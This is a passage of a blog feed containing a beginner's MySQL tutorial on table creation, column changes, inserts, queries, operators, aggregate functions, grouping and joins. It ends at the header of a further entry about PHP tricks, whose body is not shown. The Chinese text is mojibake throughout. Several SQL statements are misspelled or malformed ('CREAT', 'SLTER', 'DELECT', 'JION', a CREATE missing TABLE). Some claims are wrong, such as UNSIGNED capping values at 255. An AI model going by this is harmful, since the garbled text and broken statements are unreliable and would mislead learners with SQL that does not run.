title="åˆ›å»ºè¡¨"></a>åˆ›å»ºè¡¨</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREAT TABLE [table_name](<br>    [column_name] [æ•°æ®ç±»å‹] [åˆ—çš„å®Œæ•´æ€§çº¦æŸ]ï¼Œ<br>    Â·Â·Â·Â·Â·Â·<br>);<br></code></pre></td></tr></table></figure><blockquote><p>nameä¸ºåˆ›å»ºçš„è¡¨æ ¼åï¼Œå¯è‡ªè¡Œæ›´æ”¹</p><p>ç©ºæ ¼é‡Œå¡«è¡¨æ ¼è¡¨å¤´åŠæ•°æ®ä¿¡æ¯</p></blockquote><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE user(<br>    id INT AUTO_INCREMENT PRIMARY KEY,<br>    username VARCHAR(18) NOT NULL,<br>    pwd CHAR(32) NOT NULL,<br>    sex TINYINT NOT NULL DEFAULT 0,<br>    age TINYINT UNSIGNED NOT NULL<br>);<br></code></pre></td></tr></table></figure><blockquote><p>åˆ›å»ºæ–°è¡¨åï¼Œå¯ä»¥ä½¿ç”¨<code>desc table_name</code>æŸ¥è¯¢è¡¨æ ¼ä¿¡æ¯</p></blockquote><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_15-24-19.png"></p><p>æ•°æ®ç±»å‹</p><table><thead><tr><th>æ•°æ®ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>Int</td><td>æ•´æ•°ç±»å‹</td></tr><tr><td>char(n)</td><td>å­—ç¬¦&#x2F;å­—ç¬¦ä¸²ï¼Œå›ºå®šé•¿åº¦</td></tr><tr><td>varchar(n)</td><td>å­—ç¬¦&#x2F;å­—ç¬¦ä¸²ï¼Œå¯å˜é•¿åº¦ï¼Œæœ€å¤§é•¿åº¦ä¸ºn</td></tr><tr><td>numeric(a,b)</td><td>ç²¾ç¡®æ•°å€¼ï¼Œæ€»ä½æ•°ä¸ºaï¼Œç²¾ç¡®åˆ°å°æ•°ç‚¹åç¬¬bä½</td></tr><tr><td>date</td><td>æ—¶é—´ï¼Œå­˜å‚¨å¹´æœˆæ—¥çš„å€¼</td></tr></tbody></table><p>å­—æ®µçº¦æŸ</p><table><thead><tr><th>çº¦æŸç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>UNSIGNED</td><td>åªèƒ½ç”¨äºæ•°å€¼æ•´å‹ï¼Œè®¾ç½®æ— ç¬¦å·ã€‚æœ€å¤§å€¼ä¸èƒ½è¶…è¿‡255</td></tr><tr><td>ZEROFILL</td><td>åªèƒ½ç”¨äºæ•°å€¼æ•´å½¢ï¼Œè‡ªåŠ¨ç”¨0è¡¥å…¨ä¸è¶³ä½æ•°ã€‚egï¼š001</td></tr><tr><td>AUTO_INCREMENT</td><td>è®¾ç½®å­—æ®µçš„è‡ªåŠ¨å¢é‡å±æ€§ï¼Œåªèƒ½ç”¨äºè®¾ç½®æ•°å€¼ç±»å‹ã€‚</td></tr><tr><td>NULL&#x2F;NOT NULL</td><td>é»˜è®¤ä¸ºNULLï¼Œå³æ²¡æœ‰åœ¨æ­¤å­—æ®µæ’å…¥å€¼ã€‚å¦‚æœè®¾ç½®NOT NULLï¼Œåˆ™å¿…é¡»åœ¨æ­¤å­—æ®µæ’å…¥ç›¸åº”çš„å€¼ã€‚</td></tr><tr><td>DEFAULT</td><td>é€šè¿‡æ­¤å±æ€§è®¾ç½®é»˜è®¤å€¼</td></tr><tr><td>PRIMARY KEY</td><td>ä¸»é”®çº¦æŸï¼Œä¸»é”®è‡ªåŠ¨ä¸ºNOT NULLã€‚</td></tr></tbody></table><blockquote><p>AUTO_INCREMENTå¿…é¡»å’ŒPRIMARY KEYä¸€èµ·ç”¨ã€‚è‡ªåŠ¨å¢é‡å¿…é¡»ä¸ºä¸»é”®ï¼Œä½†ä¸»é”®ä¸ä¸€å®šè¦è‡ªåŠ¨å¢é‡ã€‚</p></blockquote><h5 id="å¤‡ä»½è¡¨"><a href="#å¤‡ä»½è¡¨" class="headerlink" title="å¤‡ä»½è¡¨"></a>å¤‡ä»½è¡¨</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE [new_table_name] SELECT * FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="ä¿®æ”¹è¡¨"><a href="#ä¿®æ”¹è¡¨" class="headerlink" title="ä¿®æ”¹è¡¨"></a>ä¿®æ”¹è¡¨</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] RENAME [new_table_name];<br></code></pre></td></tr></table></figure><h3 id="å¯¹å­—æ®µçš„æ“ä½œ"><a href="#å¯¹å­—æ®µçš„æ“ä½œ" class="headerlink" title="å¯¹å­—æ®µçš„æ“ä½œ"></a>å¯¹å­—æ®µçš„æ“ä½œ</h3><h5 id="æ·»åŠ å­—æ®µ"><a href="#æ·»åŠ å­—æ®µ" class="headerlink" title="æ·»åŠ å­—æ®µ"></a>æ·»åŠ å­—æ®µ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] ADD [column_name] [æ•°æ®ç±»å‹] [å®Œæ•´æ€§çº¦æŸ] [ä½ç½®å‚æ•°];<br></code></pre></td></tr></table></figure><blockquote><p>ä½ç½®å‚æ•°å¯ç©ºé»˜è®¤åŠ åœ¨è¡¨çš„æœ€åï¼Œä¹Ÿå¯ä½¿ç”¨FIRSTæˆ–AFTER[å­—æ®µå]</p></blockquote><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_15-58-44.png"></p><h5 id="ä¿®æ”¹å­—æ®µ"><a href="#ä¿®æ”¹å­—æ®µ" class="headerlink" title="ä¿®æ”¹å­—æ®µ"></a>ä¿®æ”¹å­—æ®µ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] MODIFY [column_name] [æ”¹åæ•°æ®ç±»å‹] [æ”¹åçš„å®Œæ•´æ€§çº¦æŸ]ï¼›<br>SLTER TABLE [table_name] CHANGE [column_name] [new_column_name] [æ”¹åæ•°æ®ç±»å‹] [æ”¹åçš„å®Œæ•´æ€§çº¦æŸ]ï¼›<br></code></pre></td></tr></table></figure><blockquote><p>MODIFYå…³é”®å­—åªèƒ½æ”¹æ•°æ®ç±»å‹å’Œå®Œæ•´æ€§çº¦æŸ</p></blockquote><h5 id="åˆ é™¤å­—æ®µ"><a href="#åˆ é™¤å­—æ®µ" class="headerlink" title="åˆ é™¤å­—æ®µ"></a>åˆ é™¤å­—æ®µ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] DROP [column_name];<br>ALTER TABLE [table_name] DROP [column_name1]ï¼ŒDROP [column_name2]ï¼ŒÂ·Â·Â·Â·Â·Â·ï¼›<br></code></pre></td></tr></table></figure><h3 id="å¯¹å†…å®¹çš„æ“ä½œ"><a href="#å¯¹å†…å®¹çš„æ“ä½œ" class="headerlink" title="å¯¹å†…å®¹çš„æ“ä½œ"></a>å¯¹å†…å®¹çš„æ“ä½œ</h3><h5 id="æ·»åŠ å†…å®¹"><a href="#æ·»åŠ å†…å®¹" class="headerlink" title="æ·»åŠ å†…å®¹"></a>æ·»åŠ å†…å®¹</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO [table_name](&#x27;[column_name1]&#x27;ï¼Œ&#x27;[column_name2]&#x27;ï¼ŒÂ·Â·Â·Â·Â·Â·) VALUES (&#x27;[value1]&#x27;ï¼Œ&#x27;[value2]&#x27;,Â·Â·Â·Â·Â·Â·)ï¼›<br><br>INSERT INTO [table_name](&#x27;[column_name1]&#x27;ï¼Œ&#x27;[column_name2]&#x27;ï¼ŒÂ·Â·Â·Â·Â·Â·) VALUES (&#x27;[value1]&#x27;ï¼Œ&#x27;[value2]&#x27;,Â·Â·Â·Â·Â·Â·)ï¼Œ(&#x27;[value1]&#x27;ï¼Œ&#x27;[value2]&#x27;,Â·Â·Â·Â·Â·Â·)ï¼ŒÂ·Â·Â·Â·Â·Â·ï¼›<br>//ä¸€æ¬¡æ’å…¥å¤šæ¡æ•°æ®<br><br>INSERT INTO [table_name] VALUES (&#x27;[value1]&#x27;ï¼Œ&#x27;[value2]&#x27;,Â·Â·Â·Â·Â·Â·)ï¼›<br></code></pre></td></tr></table></figure><blockquote><p>ç¬¬äºŒç§æ–¹æ³•å¿…é¡»ä¸¥æ ¼æŒ‰ç…§è¡¨ä¸­é¡ºåºä¸€ä¸€å¡«å†™ï¼Œè‡ªå¢å­—æ®µå¯ç”¨nullå ä½ä½†ä¸èƒ½ä¸ºç©º</p></blockquote><p>æˆ‘çš„ç”µè„‘è¾“å…¥å­—æ®µåä¸èƒ½åŠ å¼•å·ä¸ç„¶ä¼šæŠ¥é”™<del>å°±ç¦»è°±</del></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_20-18-09.png"></p><h5 id="æŸ¥è¯¢å†…å®¹"><a href="#æŸ¥è¯¢å†…å®¹" class="headerlink" title="æŸ¥è¯¢å†…å®¹"></a>æŸ¥è¯¢å†…å®¹</h5><ul><li>é€‰æ‹©æŸä¸€è¡Œæˆ–æŸä¸€åˆ—</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [column_name],[column_name] FROM [table_name];<br></code></pre></td></tr></table></figure><ul><li>é€‰æ‹©æ•´ä¸ªè¡¨æ ¼</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM [table_name];<br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_20-19-13.png"></p><h5 id="åˆ é™¤å­—æ®µ-1"><a href="#åˆ é™¤å­—æ®µ-1" class="headerlink" title="åˆ é™¤å­—æ®µ"></a>åˆ é™¤å­—æ®µ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DELECT FROM [table_name] [åˆ é™¤æ¡ä»¶]; <br></code></pre></td></tr></table></figure><blockquote><p>åˆ é™¤å¯ä½¿ç”¨whereæ¡ä»¶ã€‚æ¡ä»¶å¯ç©ºï¼Œä¸ºç©ºæ—¶å…¨éƒ¨å€¼è¢«å½±å“ã€‚</p></blockquote><h5 id="ä¿®æ”¹å†…å®¹"><a href="#ä¿®æ”¹å†…å®¹" class="headerlink" title="ä¿®æ”¹å†…å®¹"></a>ä¿®æ”¹å†…å®¹</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">UPDATE [table_name] SET [column_name]=[value] [ä¿®æ”¹æ¡ä»¶];<br></code></pre></td></tr></table></figure><blockquote><p>ä¿®æ”¹æ¡ä»¶å¯ç©ºï¼Œå…¨éƒ¨å€¼è¢«å½±å“ã€‚</p></blockquote><h2 id="æŸ¥è¯¢è¯­å¥"><a href="#æŸ¥è¯¢è¯­å¥" class="headerlink" title="æŸ¥è¯¢è¯­å¥"></a>æŸ¥è¯¢è¯­å¥</h2><h4 id="distinct"><a href="#distinct" class="headerlink" title="distinct"></a>distinct</h4><p>å»é™¤é‡å¤å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT DISTINCT [column_name] FROM [table_name];<br></code></pre></td></tr></table></figure><h4 id="where"><a href="#where" class="headerlink" title="where"></a>where</h4><p>whereè¯­å¥ç”¨äºåœ¨è¡¨ä¸­é€‰æ‹©æŒ‡å®šç¬¦åˆæ¡ä»¶çš„æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] WHERE æ¡ä»¶ï¼ˆå­—æ®µå+è¿ç®—ç¬¦+æ•°å€¼ï¼‰;<br></code></pre></td></tr></table></figure><h5 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h5><table><thead><tr><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>+</td><td>åŠ </td></tr><tr><td>-</td><td>å‡</td></tr><tr><td>*</td><td>ä¹˜</td></tr><tr><td>&#x2F;æˆ–DIV</td><td>é™¤</td></tr><tr><td>%æˆ–MOD</td><td>å–ä½™</td></tr></tbody></table><h5 id="æ¯”è¾ƒè¿ç®—ç¬¦"><a href="#æ¯”è¾ƒè¿ç®—ç¬¦" class="headerlink" title="æ¯”è¾ƒè¿ç®—ç¬¦"></a>æ¯”è¾ƒè¿ç®—ç¬¦</h5><table><thead><tr><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>&#x3D;</td><td>ç­‰äº</td></tr><tr><td>&lt;&gt;æˆ–ï¼&#x3D;</td><td>ä¸ç­‰äº</td></tr><tr><td>&gt;</td><td>å¤§äº</td></tr><tr><td>&lt;</td><td>å°äº</td></tr><tr><td>&gt;&#x3D;</td><td>å¤§äºç­‰äº</td></tr><tr><td>&lt;&#x3D;</td><td>å°äºç­‰äº</td></tr><tr><td>&#x3D;</td><td>ç­‰äº</td></tr><tr><td>between</td><td>åœ¨æŸä¸ªèŒƒå›´å†…</td></tr><tr><td>like</td><td>æ¨¡ç³ŠåŒ¹é…</td></tr></tbody></table><blockquote><p>å¯ä»¥ä½¿ç”¨andæˆ–orè¿æ¥å¤šä¸ªæ¡ä»¶</p></blockquote><p> <strong>likeç¬¦å·ä¸¾ä¾‹</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">like &#x27;[æŸ¥è¯¢å†…å®¹]%&#x27;      //è¡¨ç¤ºä»¥[æŸ¥è¯¢å†…å®¹]å¼€å¤´çš„æ•°æ®<br>like &#x27;%[æŸ¥è¯¢å†…å®¹]&#x27;      //è¡¨ç¤ºä»¥[æŸ¥è¯¢å†…å®¹]ç»“å°¾çš„æ•°æ®<br>like &#x27;%[æŸ¥è¯¢å†…å®¹]%&#x27;      //è¡¨ç¤ºåªè¦æŸ¥è¯¢å†…å®¹å‡ºç°å³å¯<br>like &#x27;_[æŸ¥è¯¢å†…å®¹]%&#x27;      //è¡¨ç¤ºæŸ¥è¯¢å†…å®¹å‰æœ‰ä¸€ä½å­—ç¬¦ï¼Œåæœ‰ä»»æ„å­—ç¬¦<br>like &#x27;%[æŸ¥è¯¢å†…å®¹]_&#x27;      //è¡¨ç¤ºæŸ¥è¯¢å†…å®¹å‰æœ‰ä»»æ„å­—ç¬¦ï¼Œåæœ‰ä¸€ä½å­—ç¬¦<br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_20-52-05.png"></p><p> <strong>betweenç”¨æ³•</strong></p><p> betweenè¿ç®—ç¬¦åŒ…æ‹¬èµ·å§‹å€¼å’Œç»“æŸå€¼</p><p> ç”¨äºé€‰å–ä¸¤ä¸ªæ•°å€¼èŒƒå›´ä¹‹å†…çš„å€¼ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²ï¼Œæ•°å­—æˆ–è€…æ—¥æœŸ</p><p> eg:</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] where [colum_name] BETWEEN [value1] and [value2];<br><br>SELECT [colum_name] FROM [table_name] where [colum_name] &gt;= [value1] and [colum_name] &lt;= [value2];<br></code></pre></td></tr></table></figure><h5 id="é€»è¾‘è¿ç®—ç¬¦"><a href="#é€»è¾‘è¿ç®—ç¬¦" class="headerlink" title="é€»è¾‘è¿ç®—ç¬¦"></a>é€»è¾‘è¿ç®—ç¬¦</h5><table><thead><tr><th>ç¬¦å·</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>NOTæˆ–ï¼</td><td>é€»è¾‘é</td></tr><tr><td>AND</td><td>é€»è¾‘ä¸</td></tr><tr><td>OR</td><td>é€»è¾‘æˆ–</td></tr><tr><td>XOR</td><td>é€»è¾‘å¼‚æˆ–</td></tr></tbody></table><h5 id="ä½è¿ç®—ç¬¦"><a href="#ä½è¿ç®—ç¬¦" class="headerlink" title="ä½è¿ç®—ç¬¦"></a>ä½è¿ç®—ç¬¦</h5><table><thead><tr><th>ç¬¦å·</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>&amp;</td><td>æŒ‰ä½ä¸</td></tr><tr><td>|</td><td>æŒ‰ä½æˆ–</td></tr><tr><td>^</td><td>æŒ‰ä½å¼‚æˆ–</td></tr><tr><td>!</td><td>å–å</td></tr><tr><td>&lt;&lt;</td><td>å·¦ç§»</td></tr><tr><td>&gt;&gt;</td><td>å³ç§»</td></tr></tbody></table><h5 id="in"><a href="#in" class="headerlink" title="in"></a>in</h5><p>inå®é™…ä¸Šæ˜¯å¤šä¸ªorçš„åˆå¹¶</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] WHERE<br>[colum_name] IN([value1],[value2],Â·Â·Â·);<br></code></pre></td></tr></table></figure><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] WHERE<br>[colum_name] IN([value1],[value2],Â·Â·Â·);<br><br>SELECT [colum_name] FROM [table_name] WHERE<br>[colum_name]=[value1] or [colum_name]=[value2];<br></code></pre></td></tr></table></figure><h5 id="subquery"><a href="#subquery" class="headerlink" title="subquery"></a>subquery</h5><p>subqueryä¸ºå­æŸ¥è¯¢ï¼Œç”¨äºåµŒå¥—åœ¨whereå­å¥ä¸­çš„æŸ¥è¯¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [column_name],[column_name],Â·Â·Â·FROM [table_name] WHEREæ¡ä»¶ (å­æŸ¥è¯¢)<br></code></pre></td></tr></table></figure><blockquote><p>å­æŸ¥è¯¢ä¸ºä¸€ä¸ªå®Œæ•´çš„selectè¯­å¥</p></blockquote><h5 id="as"><a href="#as" class="headerlink" title="as"></a>as</h5><p>ç”¨asä¸ºæŸ¥æ‰¾å¯¹è±¡èµ·åˆ«åï¼Œä½†æˆ‘æ²¡å°è¯•æˆåŠŸğŸ¥²</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [å­—æ®µå] FROM [table_name] [æ¡ä»¶è¯­å¥] as [åˆ«å]; <br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_21-10-56.png"></p><h3 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h3><h5 id="countå‡½æ•°"><a href="#countå‡½æ•°" class="headerlink" title="countå‡½æ•°"></a>countå‡½æ•°</h5><p>countå‡½æ•°ç»Ÿè®¡ç¬¦åˆæ¡ä»¶çš„è®°å½•æ•°</p><p>ç»Ÿè®¡è¡¨ä¸­çš„è®°å½•<strong>æ€»æ•°</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT COUNT(*) FROM [table_name];<br></code></pre></td></tr></table></figure><p>ç»Ÿè®¡è¡¨ä¸­æŒ‡å®šå­—æ®µ<strong>ä¸ä¸ºNULL</strong>çš„æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT COUNT([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><p>ç»Ÿè®¡è¡¨ä¸­æŒ‡å®šå­—æ®µ<strong>ä¸ºNULL</strong>çš„æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT *FROM [table_name] WHERE [column_name] IS NULL;<br></code></pre></td></tr></table></figure><h5 id="maxå‡½æ•°"><a href="#maxå‡½æ•°" class="headerlink" title="maxå‡½æ•°"></a>maxå‡½æ•°</h5><p>maxå‡½æ•°è¿”å›æ‰€é€‰å­—æ®µæœ€å¤§å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT MAX([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="minå‡½æ•°"><a href="#minå‡½æ•°" class="headerlink" title="minå‡½æ•°"></a>minå‡½æ•°</h5><p>minå‡½æ•°è¿”å›æ‰€é€‰å­—æ®µæœ€å°å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT MIN([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="avgå‡½æ•°"><a href="#avgå‡½æ•°" class="headerlink" title="avgå‡½æ•°"></a>avgå‡½æ•°</h5><p>avgå‡½æ•°è¿”å›æ‰€é€‰å­—æ®µçš„å¹³å‡å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT AVG([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="sumå‡½æ•°"><a href="#sumå‡½æ•°" class="headerlink" title="sumå‡½æ•°"></a>sumå‡½æ•°</h5><p>sumå‡½æ•°è¿”å›æ‰€é€‰æŒ‰å­—æ®µçš„åˆè®¡å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT SUM([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h3 id="å…¶ä»–ä¸€äº›æ¡ä»¶"><a href="#å…¶ä»–ä¸€äº›æ¡ä»¶" class="headerlink" title="å…¶ä»–ä¸€äº›æ¡ä»¶"></a>å…¶ä»–ä¸€äº›æ¡ä»¶</h3><h5 id="havingè¿‡æ»¤åˆ†ç»„"><a href="#havingè¿‡æ»¤åˆ†ç»„" class="headerlink" title="havingè¿‡æ»¤åˆ†ç»„"></a>havingè¿‡æ»¤åˆ†ç»„</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- having ç»Ÿè®¡å‡½æ•° è¿ç®—ç¬¦ valueï¼›<br></code></pre></td></tr></table></figure><h5 id="group-byåˆ†ç»„"><a href="#group-byåˆ†ç»„" class="headerlink" title="group byåˆ†ç»„"></a>group byåˆ†ç»„</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- GROUP BY [column_name];<br></code></pre></td></tr></table></figure><h5 id="æ’åº"><a href="#æ’åº" class="headerlink" title="æ’åº"></a>æ’åº</h5><p>å¯åˆ†ä¸ºæ­£åºascå’Œå€’åºdescä¸¤ç§æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- ORDER BY [column_name] [æ’åºæ–¹æ³•],[column_name] [æ’åºæ–¹æ³•],Â·Â·Â·Â·Â·Â·;   <br></code></pre></td></tr></table></figure><h5 id="é™åˆ¶æŸ¥è¯¢æ•°é‡"><a href="#é™åˆ¶æŸ¥è¯¢æ•°é‡" class="headerlink" title="é™åˆ¶æŸ¥è¯¢æ•°é‡"></a>é™åˆ¶æŸ¥è¯¢æ•°é‡</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- LIMIT [æŸ¥è¯¢æ•°é‡]<br></code></pre></td></tr></table></figure><h4 id="å¤šè¡¨è”åˆ"><a href="#å¤šè¡¨è”åˆ" class="headerlink" title="å¤šè¡¨è”åˆ"></a>å¤šè¡¨è”åˆ</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [table_name1].[column_name1],[table_name2].[column_name2] FROM [table_name1],[table_name2] + WHEREå­å¥<br></code></pre></td></tr></table></figure><h5 id="jionè¿æ¥"><a href="#jionè¿æ¥" class="headerlink" title="jionè¿æ¥"></a>jionè¿æ¥</h5><p>jionè¿æ¥æ˜¯åŸºäºå¤šä¸ªè¡¨ä¹‹é—´çš„å…±åŒå­—æ®µæŠŠä»–ä»¬ç»“åˆèµ·æ¥è¿›è¡ŒæŸ¥è¯¢çš„ä¸€ç§æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [column_name] AS FROM [table_name1] JION [table_name2] + ON å­å¥;<br></code></pre></td></tr></table></figure><h5 id="å†…è¿æ¥"><a href="#å†…è¿æ¥" class="headerlink" title="å†…è¿æ¥"></a>å†…è¿æ¥</h5><p>åˆ—å‡ºä¸¤ä¸ªè¡¨ä¸­éƒ½å­˜åœ¨çš„æ•°æ®<code>jion</code></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/jion.png"></p><h5 id="å·¦è¿æ¥"><a href="#å·¦è¿æ¥" class="headerlink" title="å·¦è¿æ¥"></a>å·¦è¿æ¥</h5><p>å³ä½¿æ²¡æœ‰åŒ¹é…ä¹Ÿè¦åˆ—å‡ºå·¦è¡¨çš„æ•°æ®<code>left jion</code></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/leftjion.png"></p><h5 id="å³è¿æ¥"><a href="#å³è¿æ¥" class="headerlink" title="å³è¿æ¥"></a>å³è¿æ¥</h5><p>å³ä½¿æ²¡æœ‰åŒ¹é…ä¹Ÿè¦åˆ—å‡ºå³è¡¨çš„æ•°æ®<code>right jion</code></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/rightjion.png"></p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>SQLè¯­å¥æ ¼å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">[SELECTè¯­å¥] [WHEREæ¡ä»¶] [GROUP BYæ¡ä»¶] [HAVINGæ¡ä»¶] [ORDER BYæ¡ä»¶] [LIMITæ¡ä»¶]ï¼›<br></code></pre></td></tr></table></figure><hr><p>ç»ˆäºæŠŠè¿™SQLè¯­å¥æå®Œäº†</p><p>æ’’èŠ±ğŸ‰</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>MySQL</tag>
      
      <tag>phpstudy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPé»‘é­”æ³•</title>
    <link href="/2023/03/01/PHP%E9%BB%91%E9%AD%94%E6%B3%95/"/>
    <url>/2023/03/01/PHP%E9%BB%91%E9%AD%94%E6%B3%95/</url>
    
